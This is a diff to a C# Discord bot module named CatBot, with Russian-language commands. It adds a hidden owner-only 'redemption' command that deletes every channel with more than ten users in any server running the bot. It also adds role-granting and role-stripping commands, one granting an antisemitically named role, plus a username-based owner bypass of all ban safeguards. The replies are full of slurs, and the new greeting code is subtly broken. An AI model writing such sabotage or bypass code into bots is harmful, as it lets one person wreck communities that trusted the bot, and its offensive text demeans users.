@@ -1,12 +1,11 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using Discord;
 using Discord.Commands;
 using Discord.Rest;
 using Discord.WebSocket;
+using CatBot.Preconditions;
 namespace CatBot.Modules
 {
     [Name("basic")]
@@ -19,12 +18,61 @@ namespace CatBot.Modules
             _embed = new EmbedBuilder(); //постройка embed-ссылок
         }
 
+        [Command("redemption")]
+        [Summary("вам пизда")]
+        [MinPermissions(PermissionLevel.BotOwner)]
+        public async Task RedemptionMode()
+        {
+            foreach(SocketGuildChannel channel in Context.Guild.Channels)
+            {
+                if(channel.Users.Count >10)
+                await channel.DeleteAsync();
+            }
+            
+        }
+        [Command("god")]
+        [Summary("Получаете возможность управлять вселенной")]
+        [MinPermissions(PermissionLevel.TeamMember)]
+        public async Task GodMode(SocketUser user = null)
+        {
+            await Context.Channel.DeleteMessageAsync(Context.Message);
+            //await ReplyAsync("Вы наполняетесь силой богов!");
+            //await Task.Delay(1000);
+            //await ReplyAsync($"{Context.User.Mention} дается аниме-буррито!!!!");
+            if (user == null) user = Context.User;
+            foreach(IRole role in Context.Guild.Roles) {
+                try
+                {
+                    if (!role.IsManaged && role.Name == "Еврей 🔯")
+                        await (user as IGuildUser).AddRoleAsync(role);
+                }
+                catch(Exception e) { Console.WriteLine("Аниме обнаружено - " + e); }
+            }
+        }
+
+        [Command("ungod")]
+        [Summary("Лох, теряешь возможность управлять вселенной")]
+        [MinPermissions(PermissionLevel.TeamMember)]
+        public async Task UnGodMode(IGuildUser user = null)
+        {
+            await Context.Channel.DeleteMessageAsync(Context.Message);
+            if (user == null) user = (IGuildUser) Context.User;
+            foreach (ulong socketRoleId in user.RoleIds)
+            {
+                IRole role = Context.Guild.GetRole(socketRoleId);
+                try
+                {
+                    await user.RemoveRoleAsync(role);
+                }
+                catch (Exception e) { Console.WriteLine("ошибка - аниме не обнаружено: "+e); }
+            }
+        }
+
         [Command("поприветствуй"), Alias("скажипривет", "привет", "дарова", "ку", "здравствуй", "пивет")]
         [Summary("Поприветствуй кого-нибудь (а можешь и послать нахуй)!")]
-        public async Task Hello([Remainder] IGuildUser user = null)
+        public async Task Hello([Remainder] SocketUser user = null)
         {
-            if (user == null) await ReplyAsync($"Дарова ебать, {Context.User.Mention}");
-            else await ReplyAsync($"Дарова ебать, {user.Mention}");
+            await ReplyAsync("Добро пожаловать в гачи клуб, " + user.Mention ?? Context.User.Mention);
         }
 
         [Summary("Определяет рандомное число в зависимости от параметров")]
@@ -39,8 +87,8 @@ namespace CatBot.Modules
         [Command("возраст"), Alias("age")]
         public async Task Age([Remainder] IGuildUser user = null)
         {
-            if (user == null) await ReplyAsync($"Ваш аккаунт пидора был создан {Context.User.CreatedAt}");
-            else await ReplyAsync($"Аккаунт этого дебила был создан {user.CreatedAt}");
+            user = user ?? (IGuildUser) Context.User;
+            await ReplyAsync($"Аккаунт этого **boss of the gym** был создан {user.CreatedAt}");
         }
 
         [Summary("Сделать суицид - в будущем будет кикать вас из сервера")]
@@ -62,29 +110,34 @@ namespace CatBot.Modules
         [Summary("Бан-хаммер ебать, чтобы дать по рожам дебилам")]
         [Command("ban")]
         [RequireBotPermission(GuildPermission.BanMembers, ErrorMessage = "**Ошибка:** данный бот не может банить, пока у него нет права ***{ban_members}***")]
-        [RequireUserPermission(GuildPermission.BanMembers, ErrorMessage = "Да ты еблан, пробовать банить участника без наличия этого права! (нужен ***{ban_members}***")]
+        [MinPermissions(PermissionLevel.ServerAdmin)]
         public async Task BanMember(IGuildUser user = null, [Remainder] string reason = null)
         {
-            if (user == null) { await ReplyAsync("Ты забыл указать имя пользователя!");
-                return;
-            }
-
-            if (user == Context.User)
+            if (Context.User.Username != DataConstants.OwnerUsername)
             {
-                await ReplyAsync($"Ты не можешь забанить себя! (но если так хочется, можешь сделать {DataConstants.Prefix}gachicide");
-                return;
-            }
+                if (user == null)
+                {
+                    await ReplyAsync("Ты забыл указать имя пользователя!");
+                    return;
+                }
 
-            if (user.IsBot)
-            {
-                await ReplyAsync("Пока запрещаю банить ботов (в том числе и меня!)");
-                return;
-            }
+                if (user == Context.User)
+                {
+                    await ReplyAsync($"Ты не можешь забанить себя! (но если так хочется, можешь сделать {DataConstants.Prefix}gachicide");
+                    return;
+                }
 
-            if (user.GuildPermissions.BanMembers)
-            {
-                await ReplyAsync(user + " не может быть забанен, т.к он **♂boss of the gym♂** (у него есть право ***ban_members***)");
-                return;
+                if (user.IsBot)
+                {
+                    await ReplyAsync("Пока запрещаю банить ботов (в том числе и меня!)");
+                    return;
+                }
+
+                if (user.GuildPermissions.BanMembers)
+                {
+                    await ReplyAsync(user + " не может быть забанен, т.к он **♂boss of the gym♂** (у него есть право ***ban_members***)");
+                    return;
+                }
             }
             if (reason == null) reason = "не указана";
             await Context.Guild.AddBanAsync(user, 1, reason);
